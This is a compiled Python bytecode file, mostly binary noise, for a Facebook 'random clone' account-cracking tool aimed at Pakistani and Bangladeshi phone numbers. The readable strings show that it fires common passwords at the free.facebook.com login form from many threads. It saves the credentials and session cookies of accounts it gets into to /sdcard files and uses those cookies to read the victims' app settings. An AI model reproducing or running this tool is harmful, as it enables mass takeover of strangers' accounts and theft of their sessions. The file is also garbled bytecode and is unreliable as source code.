o
    ��'cv  �                   @   s�  d dl mZ d dlmZ d dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl
Z
d dlZd dl	Z	d dlZd dlZd dlmZ d dlmZ d dlZd dlZd dlZd dlZd dl
Z
d dlZd dlZd dlZd dl	Z	d dlZd dlZd dlZd dlZd dlZd dlZd dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dl
Z
d dlZd dlZd dlZd dl	Z	d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dl
m
Z d d	l
mZ d d
l
m Z  d dl mZ d dlZ!d dlm"Z" G dd� d�Z#d dlZd dl Z d dlZd dlZd dl
Z
d dlZd dlZd dl	Z	d dlZd dlZd dl$Z$d dl%Z%d dl&Z&d dl'Z'd d
l
m Z  d dlmZ( d dl mZ) d dlmZ d dlmZ d dlmZ d dl$Z$zd dlZd dlmZ( d dlZd dl*m+Z+ W n e,�y�   e�d� e�d� Y nw d dl mZ d dlmZ d dlmZ d dlmZ d dlmZ g Z-dZ.dZ/dZ0dZ1dZ2dZ3dZ4dZ5dZ6dZ7dZ8dZ9dZ:dZ;dZ<dZ=dZ>e�?� Z?e?�@d�ZAe�?� ZBeBjCZDeBjEZFeBjGZHe�I� ZIdZJeKd �D ]`ZLd!ZMe
�g d"��ZNd#ZOe
�g d$��ZPe
�Qd%d&�ZRe
�g d$��ZSd'ZTe
�Qd(d)�ZUd*ZVe
�Qd+d,�ZWe
�Qd-d.�ZXd/ZYeM� d0eN� d1eO� eP� eR� eS� d2eT� eU� d3eV� d3eW� d3eX� d0eY� �ZZe-�[eZ� �q�ze�d4� W n   Y e\d5d6��]� �^� Z_d7d8� Z`d aag Zbg acg Zdd9d:� Zed d;lmfZg d dlmZh eieg� d< �Zjejd=k�r�ejd= Zkd>ZlnejZkd?Zld@ZmdAdB� ZndCdD� Zod aag Zbg acg ZddEdF� ZpdGdH� ZqdIdJ� ZrdKdL� ZsdMdN� ZtdOdP� ZudQdR� ZvdSdT� ZwdUdV� ZxdWdX� ZydYdZ� Zzd[d\� Z{e|d]k�r�er�  dS dS )^�    )�BeautifulSoup)�ThreadPoolExecutorN)�sleep)�system)�date)�datetime)�random)�choice)�randint)�exitc                   @   s   e Zd Zdd� ZdS )�jalanc                 C   s2   |d D ]}t j�|� t j��  t�d� qd S )N�
g;�O��n�?)�sys�stdout�write�flush�timer   )�self�z�e� r   �Ran.py�__init__   s
   
�zjalan.__init__N)�__name__�
__module__�__qualname__r   r   r   r   r   r      s    r   )�ConnectionErrorz5pip install mechanize requests futures==2 > /dev/nullzpython Hamii.pyz[1;97mz[1;96mz[1;91mz[1;92m�[1;31mz[1;32mz[1;37mz[1;93mz[1;94mz[1;95mz[1;33mz[1;34mz[1;35mz%H:%Mu   [1;33m➤[1;32m➤[0mi'  zMozilla/5.0 (Linux; U; Android)�6�7�8�9Z10Z11Z12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Z�   i�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.z>curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.htmlzua.html�rc                  C   s�   zt dd��� �� } | D ]}t�|� qW d S    t�d�j}t dd�} t�	dt
|��}|D ]	}| �|d � q/t dd��� �� } Y d S )Nz	bbnew.txtrD   z.https://bacho1001.blogspot.com/2022/07/ua.htmlz.user-agents.txt�wzline">(.*?)<r   )�open�read�
splitlines�ugen�append�requests�get�text�re�findall�strr   )ZuaZub�aZaaZunr   r   r   �uakuo   s   �
rR   c                   C   s   t �d� tt� d S )N�clear)�osr   �print�logor   r   r   r   rS   �   s   
rS   )�	localtime�   �   ZPMZAMaQ  
[0;91m                 ..              .:.
              ~YJ^.              .~J5!.
            ^G@J                   .J@B!
         ?~ B@Y                      5@&:7?
        ^@5:#@J                      Y@@!P@^
        ~@@#&@&7        ....:~      ?@@@#@@^
       7:J@@@@@7     :75####B7      ?@@@@@J^7
       !#55#@@@~:    :!~P@@@!      :~@@@#55#!
        ~P&@@@@5J?^.    !@@@Y   .^JJ5@@@@&P^
         .7YPB&@BB##BPYY#@@@@YPB##GB@&BPY7.
          ?B##&@@@@@@@@@@@@@@@@@@@@@@@##G7
           :?G&@&G#@@@@@@@@@@@@@&#B&@#P7.
              :~?7~~?#@&@@@@&@B?^!?7^.
                 !!YP5~~&@@&~~PPJ!!
                .^7J^  5@@@@Y .^J7^
                      J@&&&&@?
                     !#&G##B&#!
                     G5&5##P&PG
                     Y7&Y##5#7Y
                     ..GJ##5P..
                       J?#&Y?
                       ~7#&J^
                       .~#&!.
                        .#&:
                        .B&:
                         G#.
                         GB
                         5P
                         7J
                         .         [0;91m  



c                   C   s   t t� d�� d S )N�F______________________________________________________________________)rU   �REDr   r   r   r   �linex�   s   r\   c                 C   sd   t | �dks	 t |�dkr0tdtttt | ��f � tdtttt |��f � td� t�  d S d S )Nr   z4

[1;97m TOTAL OK : [1;97m %s  [1;97mALIEN-OK.txtz2[1;97m TOTAL CP :[1;97m   %s [1;97mALIEN-CP.txtz [1;97mPRESE ENTER TO BACK MENU )�lenrU   r)   r1   rP   �input�xyz)�ok�cpr   r   r   �checks�   s   ��
�rb   c                   C   st   t �d� tt� td� ttd� td� td� td� ttd� td� ttd� td� t�d	� t�  d S )
NrS   z/-----------------------------------------------z----------------------------------------------z	  Facebook : Alienrazorz	  TOOL :  PAK | BDz	  Github   : Alienrazorz please on internet wifi/data z	 Welcome ....�   )	rT   r   rU   rV   �cZredr   r   r_   r   r   r   r   �main�   s   





re   c              	   C   sf  | j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr2tdtttttf � n$tdt	� �t
 � tt|��D ]}tdt|d || �dd�tf � qA| j dd|id�j}t|d�}|jddd�}dd	� |�d
�D �}t|�dkr�tdtttttf � d S tdt	� �t � tt|��D ]}tdt|d || �dd�tf � q�td� d S )Nz<https://mbasic.facebook.com/settings/apps/tabbed/?tab=activeZcookie)�cookieszhtml.parserZform�post)�methodc                 S   �   g | ]}|j �qS r   �rM   ��.0�ir   r   r   �
<listcomp>�   �    zcek_apk.<locals>.<listcomp>Zh3r   z.%s[%s!%s] %sSorry there is no Active  Apk%s  u)   [🎮] %s ☆ Your Active Apps ☆     :z[%s%s] %s%sr<   zDitambahkan padaz Ditambahkan padaz>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactivec                 S   ri   r   rj   rk   r   r   r   rn   �   ro   z8%s[%s!%s] %sSorry there is no Expired Apk%s           
u)   [🎮] %s ◇ Your Expired Apps ◇    :ZKedaluwarsaz Kedaluwarsaz9---------------------------------------------------------)rL   rM   r   �findZfind_allr]   rU   r/   r.   �WHITE�GREEN�range�replace)�session�cokirE   �sop�xZgamerm   r   r   r   �cek_apk�   s&   
&
&ry   c                  C   s8  t �d� t j t �d� tt� td� t� � tt� d�� tdt� dt� dt� dt	� dt
� dt� dt� d�tt� d	 tt� d
 � d t d � tt� d�� t� � tt� dt� d�� tt� dt� d�� t� � td� td�} | dv r�t�  d S | dv r�t�  d S | dv r�t�  d S td� t�  d S )Nz1play-audio WELCOME_TO_ALIEN_RANDOM_CLONE_TOOL.mp3rS   z6           [97m[[37;41m  M A I N   M E N U   [0;m] rZ   rB   �TODAY DATE & TIME     :�/�~> �:�   �[01] zRANDOM CLONE PAK  M1�[02] zRANDOM CLONE BD  M1zM[1;91m______________________________________________________________________u   [√] CHOOSE : ��1Z01��2Z02)r?   Z00z[1;31mINCORECT OPTION![1;31m)rT   r   �getuidrU   rV   �BLUErq   r[   �ha�bu�ta�ORANGErr   rP   rQ   �lt�tagr#   r^   �password�Tabii2r   r_   )Zhamiir   r   r   r_   �   s,   
Z



r_   c                  C   s�   t �d� tt� td� t� � tt� dt� dt� d�� tt� dt� dt� d�� tt� d	t� d
t� d�� t�  td� tdt	� dt
� d��} | dv rSt�  d S | dv r\t�  d S | dv ret�  d S t�  d S )NrS   z:       [97m[[37;41m  P A S S W O R D   M E N U   [0;m] r   z 1 PASSWORD   u    [ FASTEST⚡]r�   z 2 PASSWORDS  u    [ FAST  👽]z[03] z 5 PASSWORDS  u    [ SLOW   🐌]� rB   ZCHOOSEz : r�   r�   )�3Z03)rT   r   rU   rV   r#   rq   rr   r\   r^   r[   �Alien�	password1�	password2�	password5r_   )ZpassXr   r   r   r�     s"   




r�   c                  C   s*  g } g }t j t j t �d� tt� t� � t�  td� t� � t�  t� � td� td� td� t� � t�  td� td� t�  td�}t �d� tt� t� � td	� t� � t	td
��}t
|�D ]}d�dd� t
d�D ��}| �|� qjtdd���}t�  tt| ��}tdt� dt� �| d � tdt� dt� d�� tdt� dt� �| � tdt� dt� dt� dt� dt� dt� dt� d�tt� d tt� d � d t d � tdt� d�� tt� d�� | D ]}|| }	|g}
|�t|	|
|� q�W d   � d S 1 �sw   Y  d S )NrS   �5          [97m[[37;41m  C O D E    M E N U   [0;m]� 0306 ,0300 ,0315 ,0333� 0341 ,0342 ,0345 ,0349� 0321 ,0316 ,0308 ,0309�@[97m[[37;41mBEST CODE 0300 / 0302 / 0306 / 0349 /0315   [0;m]r�   � PUT CODE : �6          [97m[[37;41m  L I M I T   M E N U   [0;m]�9 EXAMPLE: 2000, 3000, 50000, 100000

 PUT CLONING LIMIT: c                 s   �   � | ]	}t �tj�V  qd S �N�r   r	   �string�digits�rl   �_r   r   r   �	<genexpr>A  �   � zpassword1.<locals>.<genexpr>�   �   ��max_workersrB   �TOTAL IDZ             : u    ~> [ FASTEST⚡]�COUNTRY YOU CHOOSE    : �	PAKISTAN �NUMBER YOU PUT        : rz   r{   r|   r}   r~   �TO STOP PROCESS PRESS Ctrl + Z zH______________________________________________________________________==)rT   r�   �geteuidr   rU   rV   rS   r\   r^   �intrs   �joinrJ   �
ThreadPoolrP   r]   rq   r�   rr   �YELLOWr[   r�   r�   r�   r�   rQ   r�   r�   �submit�free1)�user�twf�code�limit�nmbr�nmp�manshera�tl�love�uid�pwxr   r   r   r�   #  sZ   

Z�$�r�   c                 C   ��  �zv|D �]M}t �tg�}t�� }t �t�}|�d�j}t�	dt
|���d�t�	dt
|���d�t�	dt
|���d�t�	dt
|���d�dd| |dd	�	}i d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'|�}	|jd(||	d)�j}
|j�� �� }d*|v r�d+�d,d-� |j�� �� D ��}|d.d/� } t�d0� td1|  d2 | d3 � t||� td4d5��| d6 | d7 � t�| � qd8|v �rRd9|v �rd+�d:d-� |j�� �� D ��}|d;d<� } t�d=� td>|  d? | d@ � tdAd5��| d6 | d7 � t�| � qd+�dBd-� |j�� �� D ��}|d;d<� } dC}t�dD� tdE|  dF | d@ � tdGd5��| d6 | d7 � t�| �  nqtd7 atj�dHt� dI�tt t�t t�f �f tj�!�  t"tt� W d S    Y d S )JN�https://free.facebook.com�name="lsd" value="(.*?)"r<   �name="jazoest" value="(.*?)"�name="m_ts" value="(.*?)"�name="li" value="(.*?)"r?   �Log In�	ZlsdZjazoestZm_tsZliZ
try_numberZunrecognized_triesZemail�passZlogin�	authority�free.facebook.comrh   �GET�scheme�https�accept��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�accept-encoding�gzip, deflate, br�accept-language�en-US,en;q=0.9�cache-control�no-cache�pragma�referer�https://free.facebook.com/�	sec-ch-ua�B".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"�sec-ch-ua-mobile�?0�sec-ch-ua-platform�	"Windows"�sec-fetch-dest�manifest�sec-fetch-mode�cors�sec-fetch-site�same-origin�
user-agent�ehttps://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8��dataZheaders�c_user�;c                 S   �   g | ]
\}}|d  | �qS ��=r   �rl   �key�valuer   r   r   rn   w  �    zfree1.<locals>.<listcomp>r�   �   �play-audio ALIEN_OK.mp3�[1;32m[ALIEN-OK] �    [√] r�   �/sdcard/ALIEN-OK.txtrQ   � | r   �
checkpoint�Enter login code to continuec                 S   r�   r�   r   r�   r   r   r   rn   �  r�   �   �'   �play-audio ALIEN_2F.mp3�[1;34m[ALIEN-2F] � [~] rB   �/sdcard/ALIEN-2F.txtc                 S   r�   r�   r   r�   r   r   r   rn   �  r�   r   �play-audio ALIEN_CP.mp3�[1;30m[ALIEN-CP] �    [×] �/sdcard/ALIEN-CP.txt�#[1;37m[ALIEN ] [%s] [1;97m[OK:%s�CP:%s]�#r   r	   r"   rK   ZSessionrI   rL   rM   rN   �searchrP   �grouprg   rf   Zget_dict�keysr�   �itemsrT   r   rU   ry   rF   r   r`   rJ   r�   ra   �loopr   r   r�   r]   r   rb   �r�   r�   r�   ZpsZbiru   ZproZfree_fbZlog_data�header�loZlog_cookiesrv   ZRedr   r   r   r�   P  �   

�
��������	�
������






(
r�   c            
      C   s,  g } t j t j t �d� tt� t� � t�  td� t� � t�  t� � td� td� td� t� � t�  td� td� t�  td�}t �d� tt� t� � td	� t� � t	td
��}t
|�D ]}d�dd� t
d�D ��}| �|� qhtdd���}t�  tt| ��}tdt� dt� �| d � tdt� dt� d�� tdt� dt� �| � tdt� dt� dt� dt� dt� dt� dt� d�tt� d tt� d � d t d � tdt� d�� tt� d�� | D ]}|| }||| g}	|�t||	|� q�W d   � d S 1 �sw   Y  d S )NrS   r�   r�   r�   r�   r�   r�   r�   r�   r�   c                 s   r�   r�   r�   r�   r   r   r   r�   �  r�   zpassword2.<locals>.<genexpr>r�   r�   r�   rB   r�   z ~> [ FAST ]r�   r�   r�   rz   r{   r|   r}   r~   r�   rZ   )rT   r�   r�   r   rU   rV   rS   r\   r^   r�   rs   r�   rJ   r�   rP   r]   rq   r�   rr   r�   r[   r�   r�   r�   r�   rQ   r�   r�   r�   �free2�
r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r�   �  sX   

Z�$�r�   c                 C   r�   )JNr�   r�   r<   r�   r�   r�   r?   r�   r�   r�   r�   rh   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   �  r�   zfree2.<locals>.<listcomp>r�   r�   r�   r�   r�   r�   r�   rQ   r�   r   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   �  r�   r�   r�   r�   r�   r�   rB   r   c                 S   r�   r�   r   r�   r   r   r   rn     r�   r   r  r  r  r  r  r  r  r  r   r   r   r  �  r  r  c            
      C   s2  g } t j t j t �d� tt� t� � t�  td� t� � t�  t� � td� td� td� t� � t�  td� td� t�  td�}t �d� tt� t� � td	� t� � t	td
��}t
|�D ]}d�dd� t
d�D ��}| �|� qhtdd���}t�  tt| ��}tdt� dt� �| d � tdt� dt� d�� tdt� dt� �| � tdt� dt� dt� dt� dt� dt� dt� d�tt� d tt� d � d t d � tdt� d�� tt� d�� | D ]}|| }||| dddg}	|�t||	|� q�W d   � d S 1 �sw   Y  d S ) NrS   r�   r�   r�   r�   r�   r�   r�   r�   r�   c                 s   r�   r�   r�   r�   r   r   r   r�   /  r�   zpassword5.<locals>.<genexpr>r�   r�   r�   rB   r�   u    ~> [ SLOW 🐌]r�   r�   r�   rz   r{   r|   r}   r~   r�   rZ   �786786�123456Zpakistan)rT   r�   r�   r   rU   rV   rS   r\   r^   r�   rs   r�   rJ   r�   rP   r]   rq   r�   rr   r�   r[   r�   r�   r�   r�   rQ   r�   r�   r�   �freer  r   r   r   r�     sX   

Z�$�r�   c                 C   r�   )JNr�   r�   r<   r�   r�   r�   r?   r�   r�   r�   r�   rh   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   e  r�   zfree.<locals>.<listcomp>r�   r�   r�   r�   r�   r�   r�   rQ   r�   r   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   n  r�   r�   r�   r�   r�   r�   rB   r   c                 S   r�   r�   r   r�   r   r   r   rn   u  r�   r   r  r  r  r  r  r  r  r  r   r   r   r  >  r  r  c            
      C   s�  g } t j t j t�  td� t� � t�  t� � td� t� � t�  td�}t �d� tt� t� � td� t� � t	td��}t
|�D ]}d�dd	� t
d
�D ��}| �|� qHtdd��j}t�  tt| ��}tdt� dt� �| � tdt� dt� d�� tdt� dt� �| � tdt� d�� tdt� d�� tdt� d�� tt� d�� | D ]}|| }|ddg}	|�t||	|� q�W d   � d S 1 s�w   Y  d S )Nr�   z� 880171 , 880172 , 880173 
 880174 , 880191 , 880192
 880193 , 880194 , 880181
 880182 , 880183 , 880184
 880161 , 880162 , 880163 r�   rS   r�   z7 EXAMPLE: 1000, 2000, 5000, 10000

 PUT CLONING LIMIT: r�   c                 s   r�   r�   r�   r�   r   r   r   r�   �  r�   zTabii2.<locals>.<genexpr>r�   r�   r�   z
 r�   rB   r�   zBANGLADESH r�   zPROCESS HAS BEEN STARTEDzBE PATIENT.......zTO STOP PROCESS Ctrl + Z rZ   r  r  )rT   r�   r�   rS   rU   r\   r^   r   rV   r�   rs   r�   rJ   r�   rP   r]   rq   r#   r[   r�   �mr  r   r   r   r�   �  sJ   

�"�r�   c                 C   s  �z{|D �]R}t �tg�}t�� }t �t�}t �t�}|�d�j}t�	dt
|���d�t�	dt
|���d�t�	dt
|���d�t�	dt
|���d�dd| |dd	�	}i d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'|�}	|jd(||	d)�j}
|j�� �� }d*|v r�d+�d,d-� |j�� �� D ��}|d.d/� } t�d0� td1|  d2 | d3 � t||� td4d5��| d6 | d7 � t�| � qd8|v �rWd9|v �rd+�d:d-� |j�� �� D ��}|d;d<� } t�d=� td>|  d? | d@ � tdAd5��| d6 | d7 � t�| � qd+�dBd-� |j�� �� D ��}|d;d<� } dC}t�dD� tdE|  dF | d@ � tdGd5��| d6 | d7 � t�| �  nqtd7 atj�dHt� dI�tt t�t t�f �f tj�!�  t"tt� W d S    Y d S )JNr�   r�   r<   r�   r�   r�   r?   r�   r�   r�   r�   rh   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   �  r�   zm.<locals>.<listcomp>r�   r�   r�   r�   r�   r�   r�   rQ   r�   r   r�   r�   c                 S   r�   r�   r   r�   r   r   r   rn   �  r�   r�   r�   r�   r�   r�   rB   r   c                 S   r�   r�   r   r�   r   r   r   rn   �  r�   r   r  r  r  r  r  r  r  r  r   r   r   r  �  s�   


�
��������	�
������






(
r  �__main__)}Zbs4r   rw   �concurrent.futuresr   ZtredrT   r   r   Zjsonr   rN   r�   �platform�base64ZuuidrK   r   r   r   ZhashlibZ	threadingZurllibZ	ipaddressZcalendarZ	mechanize�
subprocessr   ZwaktuZacakr	   Zpilihr
   Zressr   r   �marshalZrichZshutilZ
webbrowserr�   ZparZrequests.exceptionsr   �ModuleNotFoundErrorrI   r"   r#   r$   r%   r.   r)   r/   r&   r'   r(   r1   r[   rq   rr   r�   r�   r�   �now�strftimeZ	dt_stringZcurrent�yearr�   �monthr�   �dayr�   �todayr�   rs   Zxdrx   �brd   �dZ	randranger   �f�g�hrm   �j�k�lZuaku2rJ   rF   rG   rH   ZsockrR   r  ra   r`   r�   rS   rW   r�   �cmdr�   ZltxrQ   r�   rV   r\   rb   re   ry   r_   r�   r�   r�   r�   r  r�   r  r�   r  r   r   r   r   r   �<module>   s  X0�
�
B
$-N,H,J%
L
�